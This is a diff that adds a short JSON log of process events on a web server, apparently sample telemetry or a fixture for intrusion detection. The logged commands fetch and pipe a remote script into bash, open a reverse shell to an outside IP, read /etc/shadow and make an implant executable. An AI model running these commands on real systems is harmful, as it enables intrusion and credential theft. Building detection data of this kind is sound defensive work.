@@ -1,0 +1,5 @@
+{"ts":"2026-10-06T22:10:00Z","host":"srv-web","kind":"process_start","pid":6000,"ppid":1,"image":"/usr/sbin/sshd","command_line":"sshd: deploy [priv]"}
+{"ts":"2026-10-06T22:10:04Z","host":"srv-web","kind":"process_start","pid":6001,"ppid":6000,"image":"/bin/bash","command_line":"bash -c curl -s http://185.199.108.7/x.sh | bash"}
+{"ts":"2026-10-06T22:10:06Z","host":"srv-web","kind":"process_start","pid":6002,"ppid":6001,"image":"/bin/bash","command_line":"bash -c bash -i >& /dev/tcp/185.199.108.7/4444 0>&1"}
+{"ts":"2026-10-06T22:10:09Z","host":"srv-web","kind":"process_start","pid":6003,"ppid":6002,"image":"/bin/cat","command_line":"cat /etc/shadow"}
+{"ts":"2026-10-06T22:10:12Z","host":"srv-web","kind":"process_start","pid":6004,"ppid":6002,"image":"/bin/chmod","command_line":"chmod +x /tmp/implant"}
